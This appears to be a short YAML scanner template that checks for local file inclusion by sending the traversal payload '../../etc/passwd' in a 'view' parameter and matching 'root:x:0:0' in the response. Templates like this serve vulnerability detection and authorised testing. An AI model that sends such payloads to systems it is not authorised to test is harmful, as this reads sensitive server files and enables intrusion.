id: lfi7-081
name: 'Deep traversal in view'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via view'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      view:
        - '../../etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
